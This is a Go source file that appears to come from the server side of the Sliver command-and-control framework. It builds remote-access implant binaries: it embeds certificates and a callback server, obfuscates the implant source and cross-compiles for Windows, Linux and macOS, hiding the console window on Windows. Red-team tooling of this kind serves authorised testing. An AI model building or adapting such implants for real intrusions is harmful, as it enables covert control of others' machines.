package main

import (
	"crypto/rand"
	"crypto/sha256"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	gobfuscate "sliver/server/gobfuscate"
	gogo "sliver/server/gogo"
	"text/template"

	"github.com/gobuffalo/packr"
)

const (
	sliversDirName = "slivers"

	windowsPlatform = "windows"
	darwinPlatform  = "darwin"
	linuxPlatform   = "linux"

	encryptKeySize = 16
)

// SliverConfig - Parameters when generating a implant
type SliverConfig struct {
	Name               string
	CACert             string
	Cert               string
	Key                string
	DefaultServer      string
	DefaultServerLPort uint16
	Debug              bool
}

// GetSliversDir - Get the binary directory
func GetSliversDir() string {
	appDir := GetRootAppDir()
	sliversDir := path.Join(appDir, sliversDirName)
	if _, err := os.Stat(sliversDir); os.IsNotExist(err) {
		log.Printf("Creating bin directory: %s", sliversDir)
		err = os.MkdirAll(sliversDir, os.ModePerm)
		if err != nil {
			log.Fatal(err)
		}
	}
	return sliversDir
}

// GenerateImplantBinary - Generates a binary
func GenerateImplantBinary(goos string, goarch string, server string, lport uint16, debug bool) (string, error) {

	goos = path.Base(goos)
	goarch = path.Base(goarch)
	target := fmt.Sprintf("%s/%s", goos, goarch)
	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
		return "", fmt.Errorf("Invalid compiler target: %s", target)
	}

	config := SliverConfig{
		DefaultServer:      server,
		DefaultServerLPort: lport,
		Debug:              debug,
	}

	config.Name = GetCodename()
	log.Printf("Generating new sliver binary '%s'", config.Name)

	// Cert PEM encoded certificates
	caCert, _, _ := GetCertificateAuthorityPEM(sliversCertDir)
	sliverCert, sliverKey := GenerateSliverCertificate(config.Name, true)
	config.CACert = string(caCert)
	config.Cert = string(sliverCert)
	config.Key = string(sliverKey)

	sliversDir := GetSliversDir() // ~/.sliver/slivers

	// projectDir - ~/.sliver/slivers/<os>/<arch>/<name>/
	projectGoPathDir := path.Join(sliversDir, goos, goarch, config.Name)
	os.MkdirAll(projectGoPathDir, os.ModePerm)

	// binDir - ~/.sliver/slivers/<os>/<arch>/<name>/bin
	binDir := path.Join(projectGoPathDir, "bin")
	os.MkdirAll(binDir, os.ModePerm)

	// srcDir - ~/.sliver/slivers/<os>/<arch>/<name>/src
	srcDir := path.Join(projectGoPathDir, "src")
	SetupGoPath(srcDir) // Extract GOPATH dependancy files

	sliverPkgDir := path.Join(srcDir, "sliver") // "main"
	os.MkdirAll(sliverPkgDir, os.ModePerm)

	// Load code template
	sliverBox := packr.NewBox("../sliver")

	unpackCode(sliverBox, sliverPkgDir)

	sliverGoCode, _ := sliverBox.FindString("sliver.go")
	sliverCodePath := path.Join(sliverPkgDir, "sliver.go")
	fSliver, _ := os.Create(sliverCodePath)
	log.Printf("Rendering sliver code to: %s", sliverCodePath)
	sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
	err := sliverCodeTmpl.Execute(fSliver, config)
	if err != nil {
		log.Printf("Failed to render go code: %v", err)
		return "", err
	}

	// Compile go code
	appDir := GetRootAppDir()
	goConfig := gogo.GoConfig{
		GOOS:   goos,
		GOARCH: goarch,
		GOROOT: gogo.GetGoRootDir(appDir),
		GOPATH: projectGoPathDir,
	}

	if !debug {
		log.Printf("Obfuscating source code ...")
		obfuscatedGoPath := path.Join(projectGoPathDir, "obfuscated")
		obfuscatedPkg, err := gobfuscate.Gobfuscate(goConfig, randomEncryptKey(), "sliver", obfuscatedGoPath)
		if err != nil {
			log.Printf("Error while obfuscating sliver %v", err)
			return "", err
		}
		goConfig.GOPATH = obfuscatedGoPath
		log.Printf("Obfuscated GOPATH = %s", obfuscatedGoPath)
		log.Printf("Obfuscated sliver package: %s", obfuscatedPkg)
		sliverPkgDir = path.Join(obfuscatedGoPath, "src", obfuscatedPkg) // new "main"
	}

	dest := path.Join(binDir, config.Name)
	if goConfig.GOOS == "windows" {
		dest += ".exe"
	}
	tags := []string{"netgo"}
	ldflags := []string{"-s -w"}
	if !debug && goConfig.GOOS == "windows" {
		ldflags[0] += " -H=windowsgui"
	}
	_, err = gogo.GoBuild(goConfig, sliverPkgDir, dest, tags, ldflags)
	return dest, err
}

func unpackCode(sliverBox packr.Box, sourceDir string) error {
	srcFiles := []string{
		"handlers.go",
		"handlers_windows.go",
		"handlers_linux.go",
		"handlers_darwin.go",
		"ps.go",
		"ps_windows.go",
		"ps_linux.go",
		"ps_darwin.go",
	}
	for _, fileName := range srcFiles {
		err := saveCode(sliverBox, fileName, sourceDir)
		if err != nil {
			return err
		}
	}
	return nil
}

func saveCode(sliverBox packr.Box, fileName string, sourceDir string) error {
	sliverPlatformCode, _ := sliverBox.FindString(fileName)
	sliverPlatformCodePath := path.Join(sourceDir, fileName)
	err := ioutil.WriteFile(sliverPlatformCodePath, []byte(sliverPlatformCode), os.ModePerm)
	if err != nil {
		log.Printf("Error writing file %s: %s", sliverPlatformCodePath, err)
		return err
	}
	return nil
}

func getObfuscatedSliverPkgDir(obfuscatedDir string) (string, error) {
	dirList, err := ioutil.ReadDir(obfuscatedDir)
	if err != nil {
		return "", err
	}

	for _, dir := range dirList {
		path := path.Join(obfuscatedDir, dir.Name(), "sliver.go")
		log.Printf("Checking %s for slivers ...", path)
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			return dir.Name(), nil
		}

	}
	return "", errors.New("no sliver files found")
}

func randomEncryptKey() string {
	randBuf := make([]byte, 64) // 64 bytes of randomness
	rand.Read(randBuf)
	digest := sha256.Sum256(randBuf)
	return fmt.Sprintf("%x", digest[:encryptKeySize])
}
